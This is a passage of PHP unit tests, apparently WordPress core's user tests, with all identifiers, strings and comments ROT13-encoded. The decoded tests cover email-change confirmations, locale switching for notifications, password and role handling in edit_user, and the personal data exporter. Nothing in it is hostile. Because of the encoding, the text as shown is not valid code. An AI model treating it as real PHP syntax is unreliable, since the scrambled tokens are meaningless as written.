			'mreb fgevat'   => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => neenl( $guvf, 'po_erghea_mreb_fgevat' ),
			),
			'neenl( gehr )' => neenl(
				'rkcrpgrq' => snyfr,
				'pnyyonpx' => neenl( $guvf, 'po_erghea_neenl_gehr' ),
			),
		);
	}

	/**
	 * Irevsvrf gung gur abgvsvpngvba rznvy vf frag va gur pbeerpg ybpnyr.
	 *
	 * @gvpxrg 61518
	 */
	choyvp shapgvba grfg_jc_arj_hfre_abgvsvpngvba_fjvgpurf_ybpnyr_gb_zngpuvat_hfre() {
		erfrg_cucznvyre_vafgnapr();

		$nqzva_hfre = trg_hfre_ol( 'rznvy', trg_bcgvba( 'nqzva_rznvy' ) );

		hcqngr_bcgvba( 'JCYNAT', 'ra_TO' );
		hcqngr_hfre_zrgn( $nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		hcqngr_hfre_zrgn( frys::$pbagevo_vq, 'ybpnyr', 'rf_RF' );

		$nqzva_rznvy_ybpnyr = ahyy;
		$hfre_rznvy_ybpnyr  = ahyy;

		nqq_svygre(
			'jc_arj_hfre_abgvsvpngvba_rznvy_nqzva',
			fgngvp shapgvba ( $rznvy ) hfr ( &$nqzva_rznvy_ybpnyr ) {
				$nqzva_rznvy_ybpnyr = trg_ybpnyr();
				erghea $rznvy;
			}
		);
		nqq_svygre(
			'jc_arj_hfre_abgvsvpngvba_rznvy',
			fgngvp shapgvba ( $rznvy ) hfr ( &$hfre_rznvy_ybpnyr ) {
				$hfre_rznvy_ybpnyr = trg_ybpnyr();
				erghea $rznvy;
			}
		);

		jc_arj_hfre_abgvsvpngvba( frys::$pbagevo_vq, ahyy, 'obgu' );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$jnf_nqzva_rznvy_frag = snyfr;
		$jnf_hfre_rznvy_frag  = snyfr;

		/*
		 * Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur
		 * cbfg nhgube `oynpxohea@onggyrsvryq3.pbz` naq naq fvgr nqzva `nqzva@rknzcyr.bet`.
		 */
		$svefg_erpvcvrag = $znvyre->trg_erpvcvrag( 'gb' );
		vs ( $svefg_erpvcvrag ) {
			$jnf_nqzva_rznvy_frag = JC_GRFGF_RZNVY === $svefg_erpvcvrag->nqqerff;
			$jnf_hfre_rznvy_frag  = 'oynpxohea@onggyrsvryq3.pbz' === $svefg_erpvcvrag->nqqerff;
		}

		$frpbaq_erpvcvrag = $znvyre->trg_erpvcvrag( 'gb', 1 );
		vs ( $frpbaq_erpvcvrag ) {
			$jnf_hfre_rznvy_frag = 'oynpxohea@onggyrsvryq3.pbz' === $frpbaq_erpvcvrag->nqqerff;
		}

		$guvf->nffregGehr( $jnf_nqzva_rznvy_frag, 'Nqzva rznvy jnf abg frag nf rkcrpgrq' );
		$guvf->nffregGehr( $jnf_hfre_rznvy_frag, 'Hfre rznvy jnf abg frag nf rkcrpgrq' );
		$guvf->nffregFnzr( 'qr_QR', $nqzva_rznvy_ybpnyr, 'Nqzva rznvy jnf abg frag va gur rkcrpgrq ybpnyr' );
		$guvf->nffregFnzr( 'rf_RF', $hfre_rznvy_ybpnyr, 'Hfre rznvy jnf abg frag va gur rkcrpgrq ybpnyr' );
	}

	/**
	 * Pnyyonpx gung ergheaf 0.0.
	 *
	 * @erghea sybng 0.0.
	 */
	choyvp shapgvba po_erghea_mreb_sybng() {
		erghea 0.0;
	}

	/**
	 * Pnyyonpx gung ergheaf '0'.
	 *
	 * @erghea fgevat '0'.
	 */
	choyvp shapgvba po_erghea_mreb_fgevat() {
		erghea '0';
	}

	/**
	 * Pnyyonpx gung ergheaf neenl( gehr ).
	 *
	 * @erghea neenl neenl( gehr )
	 */
	choyvp shapgvba po_erghea_neenl_gehr() {
		erghea neenl( gehr );
	}

	/**
	 * Rafher oybt'f nqzva rznvy punatr abgvsvpngvba rznvyf qb abg pbagnva rapbqrq UGZY ragvgvrf
	 *
	 * @gvpxrg 40015
	 */
	choyvp shapgvba grfg_arj_nqzva_rznvy_abgvsvpngvba_ugzy_ragvgvrf_qrpbqrq() {
		erfrg_cucznvyre_vafgnapr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$rkvfgvat_rznvy = trg_bcgvba( 'nqzva_rznvy' );
		$arj_rznvy      = 'arj-nqzva-rznvy@grfg.qri';

		// Tvir gur fvgr n anzr pbagnvavat UGZY ragvgvrf.
		hcqngr_bcgvba( 'oybtanzr', '&#039;Grfg&#039; oybt&#039;f &dhbg;anzr&dhbg; unf &yg;ugzy ragvgvrf&tg; &nzc;' );

		hcqngr_bcgvba_arj_nqzva_rznvy( $rkvfgvat_rznvy, $arj_rznvy );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$erpvcvrag = $znvyre->trg_erpvcvrag( 'gb' );
		$rznvy     = $znvyre->trg_frag();

		// Nffreg erpvcvrag vf pbeerpg.
		$guvf->nffregFnzr( $arj_rznvy, $erpvcvrag->nqqerff, 'Nqzva rznvy punatr abgvsvpngvba erpvcvrag abg nf rkcrpgrq' );

		// Nffreg gung UGZY ragvgvrf unir orra qrpbqr va obql naq fhowrpg.
		$guvf->nffregFgevatPbagnvafFgevat( '\'Grfg\' oybt\'f \"anzr\" unf <ugzy ragvgvrf> &', $rznvy->fhowrpg, 'Rznvy fhowrpg qbrf abg pbagnva gur qrpbqrq UGZY ragvgvrf' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( '&#039;Grfg&#039; oybt&#039;f &dhbg;anzr&dhbg; unf &yg;ugzy ragvgvrf&tg; &nzc;', $rznvy->fhowrpg, $rznvy->fhowrpg, 'Rznvy fhowrpg qbrf pbagnvaf UGZY ragvgvrf' );
	}

	/**
	 * N pbasvezngvba rznvy fubhyq abg or frag vs gur arj nqzva rznvy:
	 * - Zngpurf gur rkvfgvat nqzva rznvy, be
	 * - vf abg n inyvq rznvy
	 *
	 * @qngnCebivqre qngn_hfre_nqzva_rznvy_pbasvezngvba_rznvyf
	 */
	choyvp shapgvba grfg_arj_nqzva_rznvy_pbasvezngvba_abg_frag_jura_rznvy_vainyvq( $rznvy, $zrffntr ) {
		erfrg_cucznvyre_vafgnapr();

		hcqngr_bcgvba_arj_nqzva_rznvy( trg_bcgvba( 'nqzva_rznvy' ), $rznvy );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregSnyfr( $znvyre->trg_frag(), $zrffntr );
	}

	/**
	 * Qngn cebivqre sbe grfg_zf_arj_nqzva_rznvy_pbasvezngvba_abg_frag_jura_rznvy_vainyvq().
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $rznvy   Gur arj rznvy sbe nqzva_rznvy
	 *         @glcr fgevat $zrffntr Na reebe zrffntr gb qvfcynl vs gur grfg snvyf
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_hfre_nqzva_rznvy_pbasvezngvba_rznvyf() {
		erghea neenl(
			neenl(
				trg_bcgvba( 'nqzva_rznvy' ),
				'N pbasvezngvba rznvy fubhyq abg or frag vs gur pheerag nqzva rznvy zngpurf gur arj rznvy',
			),
			neenl(
				'abg na rznvy',
				'N pbasvezngvba rznvy fubhyq abg or frag vs vg vf abg n inyvq rznvy',
			),
		);
	}

	/**
	 * N pbasvezngvba rznvy fubhyq abg or frag vs hfre'f arj rznvy:
	 * - Zngpurf gurve rkvfgvat rznvy, be
	 * - vf abg n inyvq rznvy, be
	 * - Zngpurf nabgure hfre'f rznvy
	 *
	 * @qngnCebivqre qngn_hfre_punatr_rznvy_pbasvezngvba_rznvyf
	 */
	choyvp shapgvba grfg_cebsvyr_rznvy_pbasvezngvba_abg_frag_vainyvq_rznvy( $rznvy, $zrffntr ) {

		$byq_pheerag = trg_pheerag_hfre_vq();

		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'fhofpevore',
				'hfre_rznvy' => 'rznvy@grfg.qri',
			)
		);
		jc_frg_pheerag_hfre( $hfre_vq );

		frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'fhofpevore',
				'hfre_rznvy' => 'nabgure-hfre@grfg.qri',
			)
		);

		erfrg_cucznvyre_vafgnapr();

		// Frg $_CBFG['rznvy'] jvgu arj rznvy naq $_CBFG['vq'] jvgu hfre'f VQ.
		$_CBFG['hfre_vq'] = $hfre_vq;
		$_CBFG['rznvy']   = $rznvy;
		fraq_pbasvezngvba_ba_cebsvyr_rznvy();

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregSnyfr( $znvyre->trg_frag(), $zrffntr );

		jc_frg_pheerag_hfre( $byq_pheerag );
	}

	/**
	 * Qngn cebivqre sbe grfg_zf_cebsvyr_rznvy_pbasvezngvba_abg_frag_vainyvq_rznvy().
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $rznvy   Gur hfre'f arj r-nzvy.
	 *         @glcr fgevat $zrffntr Na reebe zrffntr gb qvfcynl vs gur grfg snvyf
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_hfre_punatr_rznvy_pbasvezngvba_rznvyf() {
		erghea neenl(
			neenl(
				'rznvy@grfg.qri',
				'Pbasvezngvba rznvy fubhyq abg or frag vs vg zngpurf gur hfre\'f rkvfgvat rznvy',
			),
			neenl(
				'abg na rznvy',
				'Pbasvezngvba rznvy fubhyq abg or frag vs vg vf abg n inyvq rznvy',
			),
			neenl(
				'nabgure-hfre@grfg.qri',
				'Pbasvezngvba rznvy fubhyq abg or frag vs vg zngpurf nabgure hfre\'f rznvy',
			),
		);
	}

	/**
	 * Purpxf gung pnyyvat rqvg_hfre() jvgu ab cnffjbeq ergheaf na reebe jura nqqvat, naq qbrfa'g jura hcqngvat.
	 *
	 * @gvpxrg 35715
	 * @gvpxrg 42766
	 */
	choyvp shapgvba grfg_rqvg_hfre_oynax_cnffjbeq() {
		$_CBFG                 = neenl();
		$_TRG                  = neenl();
		$_ERDHRFG              = neenl();
		$_CBFG['ebyr']         = 'fhofpevore';
		$_CBFG['rznvy']        = 'hfre1@rknzcyr.pbz';
		$_CBFG['hfre_ybtva']   = 'hfre_ybtva1';
		$_CBFG['svefg_anzr']   = 'svefg_anzr1';
		$_CBFG['ynfg_anzr']    = 'ynfg_anzr1';
		$_CBFG['avpxanzr']     = 'avpxanzr1';
		$_CBFG['qvfcynl_anzr'] = 'qvfcynl_anzr1';

		// Purpx arj hfre jvgu zvffvat cnffjbeq.
		$erfcbafr = rqvg_hfre();

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr );
		$guvf->nffregFnzr( 'cnff', $erfcbafr->trg_reebe_pbqr() );

		// Purpx arj hfre jvgu cnffjbeq frg.
		$_CBFG['cnff1'] = 'cnffjbeq';
		$_CBFG['cnff2'] = 'cnffjbeq';

		$hfre_vq = rqvg_hfre();
		$hfre    = trg_hfre_ol( 'VQ', $hfre_vq );

		$guvf->nffregVfVag( $hfre_vq );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( 'avpxanzr1', $hfre->avpxanzr );

		// Purpx hcqngvat hfre jvgu rzcgl cnffjbeq.
		$_CBFG['avpxanzr'] = 'avpxanzr_hcqngrq';
		$_CBFG['cnff1']    = '';
		$_CBFG['cnff2']    = '';

		$hfre_vq = rqvg_hfre( $hfre_vq );

		$guvf->nffregVfVag( $hfre_vq );
		$guvf->nffregFnzr( 'avpxanzr_hcqngrq', $hfre->avpxanzr );

		// Purpx abg gb punatr na byq cnffjbeq vs n arj cnffjbeq pbagnvaf bayl fcnprf. Gvpxrg #42766.
		$hfre           = trg_hfre_ol( 'VQ', $hfre_vq );
		$byq_cnff       = $hfre->hfre_cnff;
		$_CBFG['cnff2'] = '  ';
		$_CBFG['cnff1'] = '  ';

		$hfre_vq = rqvg_hfre( $hfre_vq );
		$hfre    = trg_hfre_ol( 'VQ', $hfre_vq );

		$guvf->nffregVfVag( $hfre_vq );
		$guvf->nffregFnzr( $byq_cnff, $hfre->hfre_cnff );

		// Purpx hcqngvat hfre jvgu zvffvat frpbaq cnffjbeq.
		$_CBFG['avpxanzr'] = 'avpxanzr_hcqngrq2';
		$_CBFG['cnff1']    = 'oynax_cnff2';
		$_CBFG['cnff2']    = '';

		$erfcbafr = rqvg_hfre( $hfre_vq );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr );
		$guvf->nffregFnzr( 'cnff', $erfcbafr->trg_reebe_pbqr() );
		$guvf->nffregFnzr( 'avpxanzr_hcqngrq', $hfre->avpxanzr );

		// Purpx hcqngvat hfre jvgu rzcgl cnffjbeq ivn `purpx_cnffjbeqf` npgvba.
		nqq_npgvba( 'purpx_cnffjbeqf', neenl( $guvf, 'npgvba_purpx_cnffjbeqf_oynax_cnffjbeq' ), 10, 2 );
		$hfre_vq = rqvg_hfre( $hfre_vq );
		erzbir_npgvba( 'purpx_cnffjbeqf', neenl( $guvf, 'npgvba_purpx_cnffjbeqf_oynax_cnffjbeq' ) );

		$guvf->nffregVfVag( $hfre_vq );
		$guvf->nffregFnzr( 'avpxanzr_hcqngrq2', $hfre->avpxanzr );
	}

	/**
	 * Purpx cnffjbeqf npgvba sbe grfg_rqvg_hfre_oynax_cnffjbeq().
	 */
	choyvp shapgvba npgvba_purpx_cnffjbeqf_oynax_cnffjbeq( $hfre_ybtva, &$cnff1 ) {
		$cnff1 = '';
	}

	/**
	 * @gvpxrg 16470
	 */
	choyvp shapgvba grfg_fraq_pbasvezngvba_ba_cebsvyr_rznvy() {
		erfrg_cucznvyre_vafgnapr();
		$jnf_pbasvezngvba_rznvy_frag = snyfr;

		$hfre = frys::snpgbel()->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => 'orsber@rknzcyr.pbz',
			)
		);

		$_CBFG['rznvy']   = 'nsgre@rknzcyr.pbz';
		$_CBFG['hfre_vq'] = $hfre->VQ;

		jc_frg_pheerag_hfre( $hfre->VQ );

		qb_npgvba( 'crefbany_bcgvbaf_hcqngr' );

		vs ( ! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag ) ) {
			$jnf_pbasvezngvba_rznvy_frag = ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag[0] ) && 'nsgre@rknzcyr.pbz' === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0] );
		}

		// N pbasvezngvba rznvy vf frag.
		$guvf->nffregGehr( $jnf_pbasvezngvba_rznvy_frag );

		// Gur arj rznvy nqqerff trgf chg vagb hfre_zrgn.
		$arj_rznvy_zrgn = trg_hfre_zrgn( $hfre->VQ, '_arj_rznvy', gehr );
		$guvf->nffregFnzr( 'nsgre@rknzcyr.pbz', $arj_rznvy_zrgn['arjrznvy'] );

		// Gur rznvy nqqerff bs gur hfre qbrfa'g punatr. $_CBFG['rznvy'] fubhyq or gur rznvy nqqerff cer-hcqngr.
		$guvf->nffregFnzr( $_CBFG['rznvy'], $hfre->hfre_rznvy );
	}

	/**
	 * @gvpxrg 16470
	 */
	choyvp shapgvba grfg_erzbir_fraq_pbasvezngvba_ba_cebsvyr_rznvy() {
		erzbir_npgvba( 'crefbany_bcgvbaf_hcqngr', 'fraq_pbasvezngvba_ba_cebsvyr_rznvy' );

		erfrg_cucznvyre_vafgnapr();
		$jnf_pbasvezngvba_rznvy_frag = snyfr;

		$hfre = frys::snpgbel()->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => 'orsber@rknzcyr.pbz',
			)
		);

		$_CBFG['rznvy']   = 'nsgre@rknzcyr.pbz';
		$_CBFG['hfre_vq'] = $hfre->VQ;

		jc_frg_pheerag_hfre( $hfre->VQ );

		qb_npgvba( 'crefbany_bcgvbaf_hcqngr' );

		vs ( ! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag ) ) {
			$jnf_pbasvezngvba_rznvy_frag = ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag[0] ) && 'nsgre@rknzcyr.pbz' === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0] );
		}

		// Ab pbasvezngvba rznvy vf frag.
		$guvf->nffregSnyfr( $jnf_pbasvezngvba_rznvy_frag );

		// Ab hfrezrgn vf perngrq.
		$arj_rznvy_zrgn = trg_hfre_zrgn( $hfre->VQ, '_arj_rznvy', gehr );
		$guvf->nffregRzcgl( $arj_rznvy_zrgn );

		// $_CBFG['rznvy'] fubhyq or gur rznvy nqqerff cbfgrq sebz gur sbez.
		$guvf->nffregFnzr( $_CBFG['rznvy'], 'nsgre@rknzcyr.pbz' );
	}

	/**
	 * Rafher hfre rznvy nqqerff punatr pbasvezngvba rznvyf qb abg pbagnva rapbqrq UGZY ragvgvrf
	 *
	 * @gvpxrg 16470
	 * @gvpxrg 40015
	 */
	choyvp shapgvba grfg_fraq_pbasvezngvba_ba_cebsvyr_rznvy_ugzy_ragvgvrf_qrpbqrq() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'fhofpevore',
				'hfre_rznvy' => 'byq-rznvy@grfg.qri',
			)
		);
		jc_frg_pheerag_hfre( $hfre_vq );

		erfrg_cucznvyre_vafgnapr();

		// Tvir gur fvgr n anzr pbagnvavat UGZY ragvgvrf.
		hcqngr_bcgvba( 'oybtanzr', '&#039;Grfg&#039; oybt&#039;f &dhbg;anzr&dhbg; unf &yg;ugzy ragvgvrf&tg; &nzc;' );

		// Frg $_CBFG['rznvy'] jvgu arj r-znvy naq $_CBFG['hfre_vq'] jvgu hfre'f VQ.
		$_CBFG['hfre_vq'] = $hfre_vq;
		$_CBFG['rznvy']   = 'arj-rznvy@grfg.qri';

		fraq_pbasvezngvba_ba_cebsvyr_rznvy();

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$erpvcvrag = $znvyre->trg_erpvcvrag( 'gb' );
		$rznvy     = $znvyre->trg_frag();

		// Nffreg erpvcvrag vf pbeerpg.
		$guvf->nffregFnzr( 'arj-rznvy@grfg.qri', $erpvcvrag->nqqerff, 'Hfre rznvy punatr pbasvezngvba erpvcvrag abg nf rkcrpgrq' );

		// Nffreg gung UGZY ragvgvrf unir orra qrpbqrq va obql naq fhowrpg.
		$guvf->nffregFgevatPbagnvafFgevat( '\'Grfg\' oybt\'f \"anzr\" unf <ugzy ragvgvrf> &', $rznvy->fhowrpg, 'Rznvy fhowrpg qbrf abg pbagnva gur qrpbqrq UGZY ragvgvrf' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( '&#039;Grfg&#039; oybt&#039;f &dhbg;anzr&dhbg; unf &yg;ugzy ragvgvrf&tg; &nzc;', $rznvy->fhowrpg, 'Rznvy fhowrpg qbrf pbagnvaf UGZY ragvgvrf' );
	}

	/**
	 * @gvpxrg 42564
	 */
	choyvp shapgvba grfg_rqvg_hfre_ebyr_hcqngr() {
		$_CBFG    = neenl();
		$_TRG     = neenl();
		$_ERDHRFG = neenl();

		$nqzvavfgengbe = frys::$nqzva_vq;

		jc_frg_pheerag_hfre( $nqzvavfgengbe );

		// Qba'g yrg nalbar jvgu 'cebzbgr_hfref' (nqzvavfgengbe) rqvg gurve bja ebyr gb fbzrguvat jvgubhg vg (fhofpevore).
		$_CBFG['ebyr']     = 'fhofpevore';
		$_CBFG['rznvy']    = 'fhofpevore@fhofpevore.grfg';
		$_CBFG['avpxanzr'] = 'fhofpevore';
		$guvf->nffregFnzr( $nqzvavfgengbe, rqvg_hfre( $nqzvavfgengbe ) );

		// Fubhyq fgvyy unir gur byq ebyr.
		$guvf->nffregFnzr( neenl( 'nqzvavfgengbe' ), trg_hfreqngn( $nqzvavfgengbe )->ebyrf );

		// Cebzbgr na rqvgbe gb na nqzvavfgengbe.
		$rqvgbe = frys::$rqvgbe_vq;

		$_CBFG['ebyr']     = 'nqzvavfgengbe';
		$_CBFG['rznvy']    = 'nqzvavfgengbe@nqzvavfgengbe.grfg';
		$_CBFG['avpxanzr'] = 'nqzvavfgengbe';
		$guvf->nffregFnzr( $rqvgbe, rqvg_hfre( $rqvgbe ) );

		// Fubhyq unir gur arj ebyr.
		$guvf->nffregFnzr( neenl( 'nqzvavfgengbe' ), trg_hfreqngn( $rqvgbe )->ebyrf );
	}

	/**
	 * Grfgvat gur `jc_hfre_crefbany_qngn_rkcbegre()` shapgvba jura ab hfre rkvfgf.
	 *
	 * @gvpxrg 43547
	 */
	choyvp shapgvba grfg_jc_hfre_crefbany_qngn_rkcbegre_ab_hfre() {
		$npghny = jc_hfre_crefbany_qngn_rkcbegre( 'abg-n-hfre-rznvy@rknzcyr.pbz' );

		$rkcrpgrq = neenl(
			'qngn' => neenl(),
			'qbar' => gehr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgvat gur `jc_hfre_crefbany_qngn_rkcbegre()` shapgvba jura gur erdhrfgrq
	 * hfre rkvfgf.
	 *
	 * @gvpxrg 43547
	 */
	choyvp shapgvba grfg_jc_hfre_crefbany_qngn_rkcbegre() {
		$grfg_hfre = arj JC_Hfre( frys::$pbagevo_vq );

		$npghny = jc_hfre_crefbany_qngn_rkcbegre( $grfg_hfre->hfre_rznvy );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Ahzore bs rkcbegrq hfref.
		$guvf->nffregPbhag( 1, $npghny['qngn'] );

		// Ahzore bs rkcbegrq hfre cebcregvrf.
		$guvf->nffregPbhag( 11, $npghny['qngn'][0]['qngn'] );
	}

	/**
	 * Grfgvat gur `jc_hfre_crefbany_qngn_rkcbegre()` shapgvba
	 * jvgu Pbzzhavgl Riragf Ybpngvba VC qngn.
	 *
	 * @gvpxrg 43921
	 */
	choyvp shapgvba grfg_jc_pbzzhavgl_riragf_ybpngvba_vc_crefbany_qngn_rkcbegre() {
		$grfg_hfre = arj JC_Hfre( frys::$pbagevo_vq );

		$ybpngvba_qngn = neenl( 'vc' => '0.0.0.0' );
		hcqngr_hfre_bcgvba( $grfg_hfre->VQ, 'pbzzhavgl-riragf-ybpngvba', $ybpngvba_qngn, gehr );

		$npghny = jc_hfre_crefbany_qngn_rkcbegre( $grfg_hfre->hfre_rznvy );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Pbagnvaf 'Pbzzhavgl Riragf Ybpngvba'.
		$guvf->nffregFnzr( 'Pbzzhavgl Riragf Ybpngvba', $npghny['qngn'][1]['tebhc_ynory'] );

		// Pbagnvaf ybpngvba VC.
		$guvf->nffregFnzr( 'VC', $npghny['qngn'][1]['qngn'][0]['anzr'] );
		$guvf->nffregFnzr( '0.0.0.0', $npghny['qngn'][1]['qngn'][0]['inyhr'] );
	}

	/**
	 * Grfgvat gur `jc_hfre_crefbany_qngn_rkcbegre()` shapgvba
	 * jvgu Pbzzhavgl Riragf Ybpngvba pvgl qngn.
	 *
	 * @gvpxrg 43921
	 */
	choyvp shapgvba grfg_jc_pbzzhavgl_riragf_ybpngvba_pvgl_crefbany_qngn_rkcbegre() {
		$grfg_hfre = arj JC_Hfre( frys::$pbagevo_vq );

		$ybpngvba_qngn = neenl(
			'qrfpevcgvba' => 'Pvapvaangv',
			'pbhagel'     => 'HF',
			'yngvghqr'    => '39.1271100',
			'ybatvghqr'   => '-84.5143900',
		);
		hcqngr_hfre_bcgvba( $grfg_hfre->VQ, 'pbzzhavgl-riragf-ybpngvba', $ybpngvba_qngn, gehr );

		$npghny = jc_hfre_crefbany_qngn_rkcbegre( $grfg_hfre->hfre_rznvy );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Pbagnvaf 'Pbzzhavgl Riragf Ybpngvba'.
		$guvf->nffregFnzr( 'Pbzzhavgl Riragf Ybpngvba', $npghny['qngn'][1]['tebhc_ynory'] );

		// Pbagnvaf ybpngvba pvgl.
		$guvf->nffregFnzr( 'Pvgl', $npghny['qngn'][1]['qngn'][0]['anzr'] );
		$guvf->nffregFnzr( 'Pvapvaangv', $npghny['qngn'][1]['qngn'][0]['inyhr'] );

		// Pbagnvaf ybpngvba pbhagel.
		$guvf->nffregFnzr( 'Pbhagel', $npghny['qngn'][1]['qngn'][1]['anzr'] );
		$guvf->nffregFnzr( 'HF', $npghny['qngn'][1]['qngn'][1]['inyhr'] );

		// Pbagnvaf ybpngvba yngvghqr.
		$guvf->nffregFnzr( 'Yngvghqr', $npghny['qngn'][1]['qngn'][2]['anzr'] );
		$guvf->nffregFnzr( '39.1271100', $npghny['qngn'][1]['qngn'][2]['inyhr'] );

		// Pbagnvaf ybpngvba ybatvghqr.
		$guvf->nffregFnzr( 'Ybatvghqr', $npghny['qngn'][1]['qngn'][3]['anzr'] );
		$guvf->nffregFnzr( '-84.5143900', $npghny['qngn'][1]['qngn'][3]['inyhr'] );
	}

	/**
	 * Grfgvat gur `jc_hfre_crefbany_qngn_rkcbegre()` shapgvba
	 * jvgu Frffvba Gbxraf qngn.
	 *
	 * @gvpxrg 45889
	 */
	choyvp shapgvba grfg_jc_frffvba_gbxraf_crefbany_qngn_rkcbegre() {
		$grfg_hfre = arj JC_Hfre( frys::$pbagevo_vq );

		$frffvba_gbxraf_qngn = neenl(
			'lsg87l56457687fsq897867545st76qf78vlhutwlhv7865' => neenl(
				'rkcvengvba' => 1580461981,
				'vc'         => '0.0.0.0',
				'hn'         => 'Zbmvyyn/5.0 (Znpvagbfu; Vagry Znp BF K 10_11_6) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.117 Fnsnev/537.36',
				'ybtva'      => 1580289181,
			),
		);
		hcqngr_hfre_bcgvba( $grfg_hfre->VQ, 'frffvba_gbxraf', $frffvba_gbxraf_qngn, gehr );

		$npghny = jc_hfre_crefbany_qngn_rkcbegre( $grfg_hfre->hfre_rznvy );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Pbagnvaf Frffvba Gbxraf.
		$guvf->nffregFnzr( 'Frffvba Gbxraf', $npghny['qngn'][1]['tebhc_ynory'] );

		// Pbagnvaf Rkcvengvba.
		$guvf->nffregFnzr( 'Rkcvengvba', $npghny['qngn'][1]['qngn'][0]['anzr'] );
		$guvf->nffregFnzr( 'Wnahnel 31, 2020 09:13 NZ', $npghny['qngn'][1]['qngn'][0]['inyhr'] );

		// Pbagnvaf VC.
		$guvf->nffregFnzr( 'VC', $npghny['qngn'][1]['qngn'][1]['anzr'] );
		$guvf->nffregFnzr( '0.0.0.0', $npghny['qngn'][1]['qngn'][1]['inyhr'] );

		// Pbagnvaf VC.
		$guvf->nffregFnzr( 'Hfre Ntrag', $npghny['qngn'][1]['qngn'][2]['anzr'] );
		$guvf->nffregFnzr( 'Zbmvyyn/5.0 (Znpvagbfu; Vagry Znp BF K 10_11_6) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.117 Fnsnev/537.36', $npghny['qngn'][1]['qngn'][2]['inyhr'] );

		// Pbagnvaf VC.
		$guvf->nffregFnzr( 'Ynfg Ybtva', $npghny['qngn'][1]['qngn'][3]['anzr'] );
		$guvf->nffregFnzr( 'Wnahnel 29, 2020 09:13 NZ', $npghny['qngn'][1]['qngn'][3]['inyhr'] );
	}

	/**
	 * Grfg `$hfre_qngn['zrgn_vachg']` netf va `jc_vafreg_hfre( $hfre_qngn )`.
	 *
	 * @gvpxrg 41950
	 */
	choyvp shapgvba grfg_jc_vafreg_hfre_jvgu_zrgn() {
		$hfre_qngn   = neenl(
			'hfre_ybtva' => 'grfg_hfre',
			'hfre_cnff'  => 'grfg_cnffjbeq',
			'hfre_rznvy' => 'hfre@rknzcyr.pbz',
			'zrgn_vachg' => neenl(
				'grfg_zrgn_xrl' => 'grfg_zrgn_inyhr',
				'phfgbz_zrgn'   => 'phfgbz_inyhr',
			),
		);
		$perngr_hfre = jc_vafreg_hfre( $hfre_qngn );

		$guvf->nffregFnzr( 'grfg_zrgn_inyhr', trg_hfre_zrgn( $perngr_hfre, 'grfg_zrgn_xrl', gehr ) );
		$guvf->nffregFnzr( 'phfgbz_inyhr', trg_hfre_zrgn( $perngr_hfre, 'phfgbz_zrgn', gehr ) );

		// Hcqngr gur hfre zrgn gueh jc_vafreg_hfre.
		$hcqngr_qngn = neenl(
			'VQ'         => $perngr_hfre,
			'hfre_ybtva' => 'grfg_hfre',
			'hfre_rznvy' => 'hfre@rknzcyr.pbz',
			'zrgn_vachg' => neenl(
				'grfg_zrgn_xrl' => 'grfg_zrgn_hcqngrq',
				'phfgbz_zrgn'   => 'hcqngrq_inyhr',
				'arj_zrgn_x'    => 'arj_zrgn_iny',
			),
		);
		$hcqngr_hfre = jc_vafreg_hfre( $hcqngr_qngn );

		$guvf->nffregFnzr( 'grfg_zrgn_hcqngrq', trg_hfre_zrgn( $hcqngr_hfre, 'grfg_zrgn_xrl', gehr ) );
		$guvf->nffregFnzr( 'hcqngrq_inyhr', trg_hfre_zrgn( $hcqngr_hfre, 'phfgbz_zrgn', gehr ) );
		$guvf->nffregFnzr( 'arj_zrgn_iny', trg_hfre_zrgn( $hcqngr_hfre, 'arj_zrgn_x', gehr ) );

		// Perngr arj hfre.
		$arj_hfre_qngn = neenl(
			'hfre_ybtva' => 'arj_grfg',
			'hfre_cnff'  => 'arj_cnffjbeq',
			'hfre_rznvy' => 'arj_hfre@arjrknzcyr.pbz',
			'zrgn_vachg' => neenl(
				'grfg_zrgn_xrl' => 'grfg_zrgn_inyhr',
				'phfgbz_zrgn'   => 'arj_hfre_phfgbz_inyhr',
			),
		);

		// Ubbx svygre
		nqq_svygre( 'vafreg_phfgbz_hfre_zrgn', neenl( $guvf, 'svygre_phfgbz_zrgn' ) );

		$arj_hfre = jc_vafreg_hfre( $arj_hfre_qngn );

		// Guvf zrgn vf hcqngrq ol gur svygre.
